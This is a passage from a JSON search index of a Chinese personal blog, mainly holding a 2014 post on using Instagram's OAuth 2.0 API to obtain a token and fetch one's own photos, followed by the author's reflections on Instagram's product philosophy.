欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/tags/web/"},{"name":"OAuth","slug":"OAuth","permalink":"http://www.meng.uno/tags/OAuth/"}]},{"title":"Instagram图片拉取小经验","slug":"instagram-api","date":"2014-03-03T14:52:00.000Z","updated":"2018-03-20T06:59:57.923Z","comments":true,"path":"articles/7d661978/","link":"","permalink":"http://www.meng.uno/articles/7d661978/","excerpt":"最近喜欢上了instagram，分享一下获取照片的经验。 一、三“步”曲 instagram开放了API，授权遵循Oauth2.0协议。 1、注册client id 到管理客户端页面，选择“注册新客户端”。 这时会提示你填手机号，接着会收到短信验证码。经过验证，就到达了下面的界面： 按照字面意思填写完毕，client id就注册完毕了。 2、用client_id去换取token 在浏览器中请求： 1 https://instagram.com/oauth/authorize/?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&","text":"最近喜欢上了instagram，分享一下获取照片的经验。 一、三“步”曲 instagram开放了API，授权遵循Oauth2.0协议。 1、注册client id 到管理客户端页面，选择“注册新客户端”。 这时会提示你填手机号，接着会收到短信验证码。经过验证，就到达了下面的界面： 按照字面意思填写完毕，client id就注册完毕了。 2、用client_id去换取token 在浏览器中请求： 1 https://instagram.com/oauth/authorize/?client_id=&#123;CLIENT_ID&#125;&amp;redirect_uri=&#123;REDIRECT_URI&#125;&amp;response_type=token 花括号里面的值，对应上一步最终得到的client_id和自己设定的redirect_uri。 请求到的是一个授权页面，授权完毕后，则重定向到你的redirect_uri。注意看授权成功后的url，hash部分会附带给你的token。至此，token成功获取。 3、用token去调用API 拿到token，就等于拿到仓库的钥匙了！ 赶紧试着用token调用api查看自己的图片吧： 1 https://api.instagram.com/v1/users/&#123;USER_ID&#125;/media/recent/?access_token=&#123;TOKEN&#125; 这时，你会发现似乎…被instagram api坑了一道。user_id是个啥？机智如我，果断填上了自己的用户名。 结果错了！！！ 二、参考 更多功能可参考api文档 如果想了解Oauth授权，点此 三、再说两句 图片分享的网站万万千，instagram却只有一个。我不是此产品的脑残粉，只是觉得社区氛围这种东西，可意会而不可言传，它是社交产品的灵魂。不是每个功能相近的产品都能营造的。 事实上，instagram有很多限制，或者大家称之“功能不完善”的地方。比如，在pc上浏览网站，居然不能发图片，不能看自己关注的人，或者有哪些粉丝。这都限制死了，何以称为社交？但换个角度来想，这样就“强迫”用户去用手机操作instagram，因为产品最想想表达的，就是用摄影去快速记录生活，而已。 不用拓展业务的噱头去损坏产品的思想表达，不刻意向老板汇报我们新增了多少用户量。 “你想做什么，你就会进入什么样的圈子”，这句话，不单单是对用户而言，每个创造者心中都应有这样的思考。 本文链接： http://www.meng.uno/articles/7d661978/ 欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/tags/web/"},{"name":"经验","slug":"经验","permalink":"http://www.meng.uno/tags/经验/"},{"name":"产品","slug":"产品","permalink":"http://www.meng.uno/tags/产品/"}]}]}